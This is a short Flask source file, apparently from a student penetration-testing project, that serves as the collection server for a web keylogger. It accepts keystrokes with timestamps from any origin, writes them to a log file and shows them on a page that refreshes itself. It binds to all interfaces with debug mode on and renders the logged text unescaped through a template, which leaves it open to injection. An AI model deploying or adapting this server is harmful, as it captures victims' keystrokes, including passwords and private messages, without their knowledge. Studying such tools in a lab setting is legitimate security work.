from flask import Flask, request, render_template_string
from flask_cors import CORS 

app = Flask(__name__)
CORS(app)

@app.route('/keylogger', methods=['POST'])
def keylogger():
    print("Received POST request")
    data = request.json
    print(f"Received data: {data}")  # Debug log to check what data is received
    if data and 'key' in data and 'timestamp' in data:
        with open('D:/Amrita 4th Year/Sem_7_Projects/VAPT-WEB/webApp/outputs/keylogs.txt', 'a') as f:
            f.write(f"Key: {data['key']} at {data['timestamp']}\n")
        return 'Logged', 200
    return 'Bad Request', 400  # Return an error if data is not valid

@app.route('/', methods=['GET'])
def displayValues():
    try:
        with open('D:/Amrita 4th Year/Sem_7_Projects/VAPT-WEB/webApp/outputs/keylogs.txt', 'r') as f:
            logs = f.read()
    except FileNotFoundError:
        logs = "No logs available."

    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Real-Time Keylogger Display</title>
        <meta http-equiv="refresh" content="5"> <!-- Refresh page every 5 seconds -->
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            pre {{ background-color: #f4f4f4; padding: 10px; border: 1px solid #ddd; }}
        </style>
    </head>
    <body>
        <h1>Real-Time Keylogger Logs</h1>
        <pre>{logs}</pre>
    </body>
    </html>
    """

    return render_template_string(html_content)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
